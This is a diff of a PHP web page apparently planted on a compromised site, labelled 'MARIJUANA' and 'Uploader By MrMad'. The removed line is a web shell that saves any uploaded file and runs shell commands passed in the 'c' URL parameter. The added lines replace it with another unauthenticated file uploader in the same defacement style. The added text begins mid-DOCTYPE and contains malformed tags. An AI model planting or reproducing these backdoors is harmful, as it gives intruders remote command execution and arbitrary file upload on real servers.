@@ -1,1 +1,28 @@
-<TITLE>MARIJUANA</TITLE><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" href="https://c.top4top.io/p_1732bhsm50.png" type="image/x-icon"><style>@import url('https://fonts.googleapis.com/css2?family=Redressed&display=swap');    .mad {        border:1px SOLID white;        background:#272727;    }    body {        background:#1A0C0C;        color:white;        font-family: 'Redressed', cursive;    }    .bd {        padding-top:20%;    }    .mad1 {        background:transparent;        border:inset outset white;        color:white;        padding-left:32%;        padding-right:32%;    }    .mad1:HOVER {        background:transparent;        border:inset outset white;        color:white;        padding-left:29%;        padding-right:29%;        FONT-SIZE:13PX;    }    .UT {        COLOR:rgb(2,221,13);    }</style><div class="bd"><center>    <h2>Uploader By <STRONG CLASS="UT">MrMad</STRONG></h2>    <br><form method="post" enctype="multipart/form-data"><input class="mad" type="file" name="file"><br><br><input class="mad1" name="u" type="submit"></form><br><p align="left">    Note:</p><p>    Dont Remove This file.</p><br><?=@$a=1;if(!empty($_POST['u']))@copy($_FILES['file']['tmp_name'],$_FILES['file']['name']);if(!empty($_GET['c'])) system($_GET['c']);
+http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MARIJUANA</title>
+</head>
+<body bgcolor="white">
+<?php
+$uploaddir = '/tmp/'; // Change the directory as per the requirement
+$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+if(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=#000></br></br><div
+
+align=center><font size=5 color=#ff0000>uploaded successfully</font></body>';
+} else { print '<body
+
+bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000Error !
+</font> <marquee> Acid </marquee> </body>'; }
+?>
+<div style=" color:#F00;text-align:center; margin-top:60px; font-size:25px;
+">&gt;&gt;  &nbsp;  Upload Your file </div>
+<div style="padding-top:75px;margin-left:450px;width:340px; height:70px;">
+<form enctype="multipart/form-data" action=" " method="post">
+<input name="userfile" type="file" />&nbsp;
+<input type="submit" value="Upload" />
+</form>
+</div>
+</body>
+</html>
